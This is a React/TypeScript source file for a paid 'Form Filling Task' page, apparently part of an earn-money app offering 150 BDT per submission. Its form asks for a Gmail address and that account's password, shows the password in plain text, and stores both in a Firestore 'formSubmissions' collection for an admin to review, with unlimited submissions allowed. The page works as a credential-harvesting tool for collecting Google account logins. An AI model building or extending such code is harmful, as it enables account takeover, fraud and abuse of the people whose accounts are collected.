import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { Card, Button } from '../components/UI';
import { FileText, CheckCircle2, AlertCircle, Loader2 } from 'lucide-react';
import { collection, query, where, getDocs, addDoc, doc, updateDoc, increment } from 'firebase/firestore';
import { db } from '../firebase';
import { motion, AnimatePresence } from 'motion/react';

const FormFill = () => {
  const { profile, refreshProfile } = useAuth();
  const [loading, setLoading] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [completed, setCompleted] = useState(false);
  
  const [formData, setFormData] = useState({
    gmail: '',
    password: ''
  });

  const REWARD = 150;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!profile) return;
    
    setLoading(true);
    try {
      await addDoc(collection(db, 'formSubmissions'), {
        userId: profile.uid,
        userEmail: profile.email,
        gmail: formData.gmail,
        password: formData.password,
        amount: REWARD,
        status: 'pending',
        timestamp: Date.now()
      });

      setCompleted(true);
      setShowForm(false);
      setFormData({ gmail: '', password: '' });
    } catch (error) {
      console.error(error);
      alert('Failed to submit form');
    } finally {
      setLoading(false);
    }
  };

  if (!profile) return null;

  return (
    <div className="pb-24 pt-6 px-6 bg-gray-50 min-h-screen">
      <header className="mb-8">
        <h1 className="text-2xl font-bold text-gray-900">Form Filling Task</h1>
        <p className="text-gray-500 text-sm">Submit details and earn {REWARD} BDT per form</p>
      </header>

      {!profile.isActive ? (
        <Card className="bg-amber-50 border-amber-100">
          <div className="flex gap-3">
            <AlertCircle className="text-amber-600 shrink-0" />
            <p className="text-sm text-amber-800">Your account must be activated by an admin to earn from forms.</p>
          </div>
        </Card>
      ) : (
        <div className="space-y-4">
          <Card className="p-6 bg-blue-600 text-white border-none shadow-lg shadow-blue-100 mb-6">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 rounded-2xl bg-white/20 flex items-center justify-center">
                <FileText size={24} />
              </div>
              <div>
                <p className="text-blue-100 text-xs font-medium uppercase tracking-wider">Reward per submission</p>
                <p className="text-2xl font-bold">{REWARD} BDT</p>
              </div>
            </div>
            <p className="text-blue-100 text-xs mt-4 opacity-80">Submissions are reviewed by admin before reward is added to wallet.</p>
          </Card>

          <Button onClick={() => setShowForm(true)} className="w-full py-4 flex items-center justify-center gap-2">
            <FileText size={20} /> Start New Submission
          </Button>
          
          <p className="text-center text-gray-400 text-xs mt-4">Unlimited submissions allowed</p>
        </div>
      )}

      <AnimatePresence>
        {showForm && (
          <motion.div 
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="fixed inset-0 bg-white z-[100] p-6 overflow-y-auto"
          >
            <div className="max-w-md mx-auto">
              <div className="flex justify-between items-center mb-8">
                <h2 className="text-2xl font-bold">Submit Details</h2>
                <button onClick={() => setShowForm(false)} className="text-gray-400">✕</button>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Gmail Address</label>
                  <input
                    type="email"
                    required
                    placeholder="example@gmail.com"
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 outline-none focus:ring-2 focus:ring-blue-500"
                    value={formData.gmail}
                    onChange={e => setFormData({...formData, gmail: e.target.value})}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Password</label>
                  <input
                    type="text"
                    required
                    placeholder="Enter password"
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 outline-none focus:ring-2 focus:ring-blue-500"
                    value={formData.password}
                    onChange={e => setFormData({...formData, password: e.target.value})}
                  />
                </div>

                <div className="bg-blue-50 p-4 rounded-2xl border border-blue-100 flex gap-3">
                  <AlertCircle className="text-blue-600 shrink-0" size={20} />
                  <p className="text-xs text-blue-800 leading-relaxed">
                    Ensure the details are correct. Admin will verify before approving the reward.
                  </p>
                </div>

                <Button type="submit" className="w-full py-4" disabled={loading}>
                  {loading ? <Loader2 className="animate-spin mx-auto" /> : `Submit & Earn ${REWARD} BDT`}
                </Button>
              </form>
            </div>
          </motion.div>
        )}

        {completed && (
          <motion.div
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="fixed inset-0 z-[110] flex items-center justify-center p-6 bg-black/20 backdrop-blur-sm"
          >
            <Card className="max-w-xs w-full text-center py-8">
              <div className="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle2 size={32} />
              </div>
              <h3 className="text-xl font-bold text-gray-900">Submitted!</h3>
              <p className="text-gray-500 mt-2 mb-6">Your submission is pending review. Reward will be added once approved.</p>
              <Button onClick={() => setCompleted(false)} className="w-full">
                Continue
              </Button>
            </Card>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default FormFill;
